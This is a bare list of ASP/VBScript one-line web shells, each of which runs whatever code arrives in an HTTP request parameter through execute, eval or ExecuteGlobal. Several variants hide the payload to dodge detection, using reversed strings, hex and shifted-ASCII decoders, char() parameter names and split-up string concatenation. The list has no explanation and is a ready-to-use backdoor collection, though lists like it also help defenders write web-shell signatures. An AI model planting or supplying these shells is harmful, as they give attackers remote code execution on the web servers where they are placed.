<% execute(request("value")) %>

<% execute request("value") %>

<% eval request("value") %>

<% If Request("value")<>"" Then Execute(Request("value"))%>

<script language = VBScript runat="server">execute request("value")</script>

<%eval(Request.Item["value"],"unsafe");%>

<%%25Execute(request("a"))%%25>

<%execute request(char(97))%>
<%eval request(char(97))%>

<script language=VBScript runat=server>if request(chr(35))<>"""" then
ExecuteGlobal request(chr(35))
</script>

<%
Function MorfiCoder(Code)
    MorfiCoder=Replace(Replace(StrReverse(Code),"/*/",""""),"\*\",vbCrlf)
End Function
Execute MorfiCoder(")/*/z/*/(tseuqer lave")
%>

<% 
dim x1,x2
x1 = request("pass") 
x2 = x1 
eval x2 
%>

<%
password=Request("Class")
Execute(AACode("457865637574652870617373776F726429"))
Function AACode(byVal s)
    For i=1 To Len(s) Step 2
        c=Mid(s,i,2)
        If IsNumeric(Mid(s,i,1)) Then
            Execute("AACode=AACode&chr(&H"&c&")")
        Else
            Execute("AACode=AACode&chr(&H"&c&Mid(s,i+2,2)&")")
            i=i+2
        End If
    Next
End Function
%>

<%
password=Request("Class")
Execute(DeAsc("%87%138%119%117%135%134%119%58%130%115%133%133%137%129%132%118%59")):Function DeAsc(Str):Str=Split(Str,"%"):For I=1 To Ubound(Str):DeAsc=DeAsc&Chr(Str(I)-18):Next:End Function
%>

<%eval""&("e"&"v"&"a"&"l"&"("&"r"&"e"&"q"&"u"&"e"&"s"&"t"&"("&"8"&"-"&"5"&"-"&"3"&")"&")")%>